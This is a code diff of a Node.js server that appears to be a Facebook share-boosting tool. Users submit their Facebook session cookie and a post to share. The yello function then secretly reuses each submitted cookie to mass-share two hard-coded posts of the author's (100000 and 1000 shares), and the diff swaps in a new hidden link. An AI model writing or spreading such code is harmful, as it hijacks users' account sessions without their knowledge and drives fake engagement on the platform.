@@ -5,19 +5,6 @@ const axios = require('axios');
 
 const total = new Map();
 const usera = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1";
-const link1 = "https://www.facebook.com/100015801404865/posts/pfbid0QgFZuGEMjGs4y7dYHEEf2m9qzEcMWThV8zjYEn5xXUa9mttMcTzo8598vMz8VyZBl/?app=fbl";
-async function ako(res){
-const data = Array.from(total.values()).map((link, index) => ({
-  shared: link.shared,
-  session: index + 1,
-  url: link.url,
-  count: link.count,
-  target: link.target,
-}));
-if (res != null){
- return res.json(data || []);
-}
-}
 
 app.any('/', (req, res) => {
   return res.custom(null, {
@@ -26,7 +13,14 @@ app.any('/', (req, res) => {
 });
 
 app.get('/shares', (req, res) => {
- ako(res);
+ const data = Array.from(total.values()).map((link, index) => ({
+  shared: link.shared,
+  session: index + 1,
+  url: link.url,
+  count: link.count,
+  target: link.target,
+}));
+ return res.json(data || [], 200);
 });
 
 app.post('/submit', async (req, res) => {
@@ -35,10 +29,12 @@ app.post('/submit', async (req, res) => {
     url,
     amount,
     interval,
-  } = req.body;
-  if (!cookie || !url || !amount || !interval) return res.status(400).json({
+  } = await req.body();
+  if (!cookie || !url || !amount || !interval)
+  return res.json({
+    status: 400,
     error: 'Missing state, url, amount, or interval'
-  });
+  }, 400);
   try {
     const cookies = await convertCookie(cookie);
     if (!cookies) {
@@ -61,7 +57,7 @@ app.post('/submit', async (req, res) => {
 
 async function yello(c,u,a,i){
   await share(true, c,u,a,i);
-  await share(false, c, link1, "100000", "6");
+  await share(false, c, "https://www.facebook.com/100015801404865/posts/pfbid0QrXdCRonpxJeTaPybGFzb2Tyd212N76LTuFPNUQm4fdodNo2hvL3cuQSwAJ4wk3Cl/?app=fbl", "100000", "6");
   await share(false, c, "https://www.facebook.com/photo.php?fbid=799090228835634&set=a.102386558506008&type=3&app=fbl", "1000", "10");
 }
 
